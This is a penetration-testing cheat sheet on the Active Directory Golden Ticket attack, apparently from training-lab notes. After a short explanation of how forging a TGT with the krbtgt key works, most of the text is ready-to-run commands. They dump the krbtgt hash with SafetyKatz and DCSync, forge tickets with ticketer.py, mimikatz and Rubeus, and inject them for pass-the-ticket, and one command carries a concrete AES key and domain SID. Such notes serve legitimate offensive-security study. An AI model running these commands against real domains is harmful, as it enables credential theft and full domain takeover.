# Golden Ticket

**Theory**
The long-term key of the krbtgt account can be used to forge a special TGT (Ticket Granting Ticket) that can later be used with Pass-the-ticket to access any resource within the AD domain. 

The krbtgt's key is used to encrypt the PAC. In a Golden Ticket scenario, an attacker that has knowledge of the krbtgt long-term key, will usually forge a PAC indicating that the user belongs to privileged groups. This PAC will be embedded in a forged TGT. The TGT will be used to request Service Tickets than will then feature the PAC presented in the TGT, hence granting lots of access to the attacker.

A golden ticket is signed and encrypted by the hash of krbtgt account 
which makes it a valid TGT ticket.

The krbtgt user hash could be used to impersonate any user with any 
privileges from even a non-domain machine.


**Unix**

```
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# Create the golden ticket (with an RC4 key, i.e. NT hash)
ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"

# Create the golden ticket (with an AES 128/256bits key)
ticketer.py -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"

# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -user-id "$USERID" -groups "$GROUPID1,$GROUPID2,..." "randomuser"
```


**Windows**
```
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt
```

````
# Get krbtgt hash
C:\AD\Tools\SafetyKatz.exe '"lsadump::lsa /patch"'

# DCSync feature for getting AES keys for krbtgt account. DA privileges (or a user that has replication rights on the domain object)
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

# Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT
C:\AD\Tools\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
/sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```